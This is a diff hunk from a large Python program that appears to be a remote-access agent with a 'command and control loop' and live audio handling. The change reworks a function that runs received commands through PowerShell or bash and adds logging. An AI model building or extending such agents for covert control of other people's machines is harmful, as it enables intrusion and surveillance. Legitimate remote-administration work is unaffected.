@@ -6293,10 +6293,12 @@ def handle_live_audio(command_parts):
     except Exception as e:
         return f"Live audio processing failed: {e}"
 def execute_command(command):
-    """Execute a command and return its output - COPIED FROM WORKING simple-client.py"""
+    """Execute a command and return its output"""
     try:
-        if WINDOWS_AVAILABLE:
-            # Use PowerShell on Windows (EXACT COPY from simple-client.py that works!)
+        log_message(f"Executing command: {command}", "info")
+        
+        if platform.system() == "Windows":
+            # Use PowerShell on Windows
             result = subprocess.run(
                 ["powershell.exe", "-NoProfile", "-Command", command],
                 capture_output=True,
@@ -6317,19 +6319,23 @@ def execute_command(command):
         if not output:
             output = "[No output from command]"
         
+        log_message(f"Command output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
         return output
         
     except subprocess.TimeoutExpired:
         error_msg = "Command execution timed out after 30 seconds"
+        log_message(error_msg, "error")
         return error_msg
     except FileNotFoundError:
-        if WINDOWS_AVAILABLE:
+        if platform.system() == "Windows":
             error_msg = "PowerShell not found. Command execution failed."
         else:
             error_msg = "Bash not found. Command execution failed."
+        log_message(error_msg, "error")
         return error_msg
     except Exception as e:
         error_msg = f"Command execution failed: {e}"
+        log_message(error_msg, "error")
         return error_msg
 def main_loop(agent_id):
     """The main command and control loop."""
